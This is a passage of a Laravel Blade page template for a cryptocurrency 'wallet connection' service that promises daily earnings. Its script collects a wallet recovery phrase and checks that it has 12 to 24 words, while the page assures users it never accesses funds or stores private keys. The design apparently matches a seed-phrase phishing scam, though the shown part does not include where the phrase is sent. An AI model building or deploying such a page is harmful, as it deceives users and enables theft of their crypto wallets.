                                            d="M15 12a3 3 0 11-6 0 3 3 0 016 0zm-3-9v3m0 12v3m9-9h-3M6 12H3m14.12-5.88l-2.12 2.12M8 16l-2.12 2.12M17.95 16.95L15.83 14.83M8.17 9.17L6.05 7.05" />
                                    </svg>
                                </div>
                                <div>
                                    <p class="text-[10px] font-black text-white uppercase tracking-tight">Privacy First</p>
                                    <p class="text-[9px] text-slate-500 font-bold uppercase leading-relaxed mt-1">We never
                                        access your funds or store private keys</p>
                                </div>
                            </div>
                            <div class="flex items-start space-x-4">
                                <div class="h-9 w-9 rounded-xl bg-yellow-500/10 flex items-center justify-center flex-shrink-0">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-yellow-400" fill="none"
                                        viewBox="0 0 24 24" stroke="currentColor">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                            d="M13 10V3L4 14h7v7l9-11h-7z" />
                                    </svg>
                                </div>
                                <div>
                                    <p class="text-[10px] font-black text-white uppercase tracking-tight">Instant Connection</p>
                                    <p class="text-[9px] text-slate-500 font-bold uppercase leading-relaxed mt-1">Set up in
                                        seconds, rewards start immediately</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    {{-- Help --}}
                    <div class="dashboard-glass border-white/5 p-6">
                        <div class="flex items-center space-x-3 mb-4">
                            <div class="h-9 w-9 rounded-xl bg-yellow-500/10 flex items-center justify-center">
                                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 gold-text" fill="none"
                                    viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                                </svg>
                            </div>
                            <p class="text-[10px] font-black text-white uppercase tracking-widest">Need Help?</p>
                        </div>
                        <p class="text-[10px] text-slate-500 font-bold uppercase leading-relaxed mb-4">Can't find your wallet?
                            Contact our support team for assistance.</p>
                        <a href="{{ route('support') }}"
                            class="flex items-center justify-center w-full py-3 rounded-xl bg-white/5 border border-white/10 text-[10px] font-black text-yellow-500 uppercase tracking-widest hover:bg-white/10 transition-all">
                            Contact Support
                        </a>
                    </div>
                </div>

            </div>

        @else
            {{-- Already Connected State --}}
            <div class="max-w-2xl mx-auto">
                <div class="dashboard-glass border-emerald-500/20 p-12 relative overflow-hidden text-center">
                    <div class="absolute inset-0 bg-emerald-500/[0.02] pointer-events-none"></div>
                    <div
                        class="h-20 w-20 rounded-full bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center mx-auto mb-8">
                        <svg xmlns="http://www.w3.org/2000/svg" class="w-10 h-10 text-emerald-400" fill="none"
                            viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                        </svg>
                    </div>
                    <h2 class="text-2xl font-black text-white uppercase tracking-tight mb-3">Wallet <span
                            class="text-emerald-400">Connected</span></h2>
                    <p class="text-slate-400 text-sm font-medium mb-10 max-w-sm mx-auto">Your wallet is actively connected and
                        earning <span class="text-white font-black">{{ $settings->currency }}{{ $settings->min_return }}</span>
                        daily.</p>

                    <div class="grid grid-cols-2 gap-6 mb-10">
                        <div class="p-6 rounded-2xl bg-white/[0.02] border border-white/5 text-center">
                            <div class="text-2xl font-black gold-text">{{ $settings->currency }}{{ $settings->min_return }}
                            </div>
                            <div class="text-[9px] font-black text-slate-500 uppercase tracking-widest mt-2">Daily Earnings
                            </div>
                        </div>
                        <div class="p-6 rounded-2xl bg-white/[0.02] border border-white/5 text-center">
                            <div class="text-2xl font-black text-white">{{ $settings->currency }}{{ $settings->min_balance }}
                            </div>
                            <div class="text-[9px] font-black text-slate-500 uppercase tracking-widest mt-2">Min. Balance</div>
                        </div>
                    </div>

                    <div class="flex flex-col sm:flex-row gap-4 justify-center">
                        <a href="{{ route('dashboard') }}"
                            class="h-14 px-10 rounded-2xl gold-gradient-bg text-black font-black text-xs uppercase tracking-[0.3em] flex items-center justify-center space-x-2">
                            <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" fill="none" viewBox="0 0 24 24"
                                stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
                            </svg>
                            <span>Go to Dashboard</span>
                        </a>
                        <a href="{{ route('support') }}"
                            class="h-14 px-10 rounded-2xl bg-white/5 border border-white/10 text-slate-300 font-black text-xs uppercase tracking-[0.3em] flex items-center justify-center space-x-2 hover:bg-white/10 transition-all">
                            <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" fill="none" viewBox="0 0 24 24"
                                stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M18.364 5.636l-3.536 3.536m0 5.656l3.536 3.536M9.172 9.172L5.636 5.636m3.536 9.192l-3.536 3.536M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-5 0a4 4 0 11-8 0 4 4 0 018 0z" />
                            </svg>
                            <span>Get Support</span>
                        </a>
                    </div>
                </div>
            </div>
        @endif

    </div>

    <script>
        function walletConnectManager() {
            return {
                selectedWallet: '',
                recoveryPhrase: '',
                isConnecting: false,
                showOtherWallets: false,
                hasError: false,

                init() {
                    if (typeof lucide !== 'undefined') lucide.createIcons();
                },

                selectWallet(wallet) {
                    this.selectedWallet = wallet;
                    this.showOtherWallets = false;
                },

                get wordCount() {
                    if (!this.recoveryPhrase) return 0;
                    return this.recoveryPhrase.trim().split(/\s+/).filter(w => w.length > 0).length;
                },

                get hasInvalidChars() {
                    if (!this.recoveryPhrase) return false;
                    return !/^[a-zA-Z\s]+$/.test(this.recoveryPhrase);
                },

                get isValidPhrase() {
                    return this.wordCount >= 12 && this.wordCount <= 24 && !this.hasInvalidChars;
                },

                validatePhrase() {
                    this.hasError = this.recoveryPhrase.length > 0 && (this.hasInvalidChars || (this.wordCount > 0 && this.wordCount < 12));
                }
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            if (typeof lucide !== 'undefined') lucide.createIcons();
        });
    </script>

@endsection